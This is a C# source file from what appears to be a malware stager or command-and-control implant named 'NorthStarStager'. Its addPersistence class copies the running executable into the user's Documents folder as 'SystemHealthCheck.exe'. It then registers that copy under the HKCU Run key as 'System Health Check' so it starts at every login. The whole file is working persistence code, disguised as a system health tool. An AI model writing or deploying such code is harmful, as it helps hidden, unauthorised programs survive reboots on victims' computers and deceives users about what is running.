using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;


namespace NorthStarStager
{
    class addPersistence
    {
       
        static string fileNameSpace = "SystemHealthCheck.exe";
        string filePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        string  newFilePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + fileNameSpace;
        //string newFilePath =  Path.GetTempPath() + fileNameSpace;
        string keys = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run";

   
        private string _addStartup()
        {
          
                try
                {
                   
                    if (Registry.GetValue(keys, "System Health Check", null) == null)
                    {
                        // if key doesn't exist
                        using (RegistryKey key =
                        Registry.CurrentUser.OpenSubKey
                        ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                        {
                            key.SetValue("System Health Check", "\"" + newFilePath + "\"");
                            key.Dispose();
                            key.Flush();
                        return "Added to startup folder";
                        }
                    }
                else
                {
                    return "Its already added to start-up folder";
                }

                }
                catch
                {
                    return "An err occured.";
                }


        }

        public string _copyItSelf()
        {
            if (!File.Exists(newFilePath))
            {
                try
                {
                    System.IO.File.Copy(filePath, newFilePath);
                    return _addStartup();
                }
                catch
                {
                    return "An error occured";
                }
              
            }
            else
            {
               return  _addStartup();
                
            }


        }
    }
}
